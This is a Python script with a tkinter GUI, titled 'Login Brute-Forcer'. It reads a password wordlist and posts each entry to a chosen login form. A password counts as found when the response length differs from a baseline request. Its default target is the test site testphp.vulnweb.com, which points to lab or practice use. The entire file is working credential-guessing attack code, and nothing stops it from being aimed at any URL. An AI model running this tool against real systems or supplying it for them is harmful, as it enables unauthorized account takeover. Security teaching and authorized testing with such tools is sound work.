import requests
import tkinter as tk
from tkinter import filedialog, scrolledtext, messagebox

def brute_force_login(url, username, password_list, output_text_widget):
    output_text_widget.insert(tk.END, "Starting brute-force attack...\n")
    output_text_widget.see(tk.END)

    # Get baseline content length with a dummy request
    data = {'uname': 'a', 'pass': 'a'}
    baseline_length = -1
    try:
        response = requests.post(url, data=data, allow_redirects=True)
        baseline_length = len(response.text)
        output_text_widget.insert(tk.END, f"Baseline content length: {baseline_length}\n")
        output_text_widget.see(tk.END)
    except requests.exceptions.RequestException as e:
        output_text_widget.insert(tk.END, f"Error getting baseline response: {e}\n")
        output_text_widget.see(tk.END)
        return False

    if baseline_length == -1:
        return False

    found_password = False
    for password in password_list:
        password = password.strip()  
        if not password:  
            continue

        data = {
            'uname': username,
            'pass': password
        }
        try:
            response = requests.post(url, data=data, allow_redirects=True)
            current_length = len(response.text)
            log_message = f"Trying password: {password} - Status: {response.status_code}, URL: {response.url}, Content length: {current_length}\n"
            output_text_widget.insert(tk.END, log_message)
            output_text_widget.see(tk.END)

            if current_length != baseline_length:
                output_text_widget.insert(tk.END, f"PASSWORD FOUND: {password}\n")
                output_text_widget.see(tk.END)
                found_password = True
                break
            else:
                output_text_widget.insert(tk.END, f"Trying password: {password} - Failed (Content length matches baseline)\n")
                output_text_widget.see(tk.END)
        except requests.exceptions.RequestException as e:
            output_text_widget.insert(tk.END, f"An error occurred with password '{password}': {e}\n")
            output_text_widget.see(tk.END)
        output_text_widget.update_idletasks() 

    if not found_password:
        output_text_widget.insert(tk.END, "No valid password found.\n")
        output_text_widget.see(tk.END)
    
    return found_password

class BruteForceGUI:
    def __init__(self, master):
        self.master = master
        master.title("Login Brute-Forcer")

    
        self.input_frame = tk.LabelFrame(master, text="Configuration", padx=10, pady=10)
        self.input_frame.pack(padx=10, pady=10, fill="x")

        tk.Label(self.input_frame, text="Target URL:").grid(row=0, column=0, sticky="w", pady=2)
        self.url_entry = tk.Entry(self.input_frame, width=50)
        self.url_entry.grid(row=0, column=1, padx=5, pady=2)
        self.url_entry.insert(0, "http://testphp.vulnweb.com/userinfo.php") 

        tk.Label(self.input_frame, text="Username:").grid(row=1, column=0, sticky="w", pady=2)
        self.username_entry = tk.Entry(self.input_frame, width=50)
        self.username_entry.grid(row=1, column=1, padx=5, pady=2)
        self.username_entry.insert(0, "test") # Default value

        tk.Label(self.input_frame, text="Wordlist Path:").grid(row=2, column=0, sticky="w", pady=2)
        self.wordlist_path_entry = tk.Entry(self.input_frame, width=50)
        self.wordlist_path_entry.grid(row=2, column=1, padx=5, pady=2)
        
        self.browse_button = tk.Button(self.input_frame, text="Browse", command=self.browse_wordlist)
        self.browse_button.grid(row=2, column=2, padx=5, pady=2)

        self.start_button = tk.Button(master, text="Start Brute-Force", command=self.start_attack)
        self.start_button.pack(pady=10)

    
        self.output_frame = tk.LabelFrame(master, text="Output", padx=10, pady=10)
        self.output_frame.pack(padx=10, pady=10, fill="both", expand=True)

        self.output_text = scrolledtext.ScrolledText(self.output_frame, wrap=tk.WORD, width=80, height=20)
        self.output_text.pack(expand=True, fill="both")

    def browse_wordlist(self):
        file_path = filedialog.askopenfilename(
            title="Select Password Wordlist",
            filetypes=(("Text files", "*.txt"), ("All files", "*.*"))
        )
        if file_path:
            self.wordlist_path_entry.delete(0, tk.END)
            self.wordlist_path_entry.insert(0, file_path)

    def start_attack(self):
        target_url = self.url_entry.get().strip()
        username = self.username_entry.get().strip()
        wordlist_path = self.wordlist_path_entry.get().strip()

        if not target_url or not username or not wordlist_path:
            messagebox.showerror("Input Error", "All fields must be filled.")
            return

        try:
            with open(wordlist_path, 'r') as f:
                passwords = f.readlines()
            self.output_text.insert(tk.END, f"Loaded {len(passwords)} passwords from {wordlist_path}\n")
            self.output_text.see(tk.END)
        except FileNotFoundError:
            messagebox.showerror("File Error", "Could not read password file. Please check the path.")
            return
        except Exception as e:
            messagebox.showerror("File Error", f"An error occurred reading the password file: {e}")
            return

    
        self.output_text.delete(1.0, tk.END)

        
        brute_force_login(target_url, username, passwords, self.output_text)

if __name__ == "__main__":
    root = tk.Tk()
    app = BruteForceGUI(root)
    root.mainloop()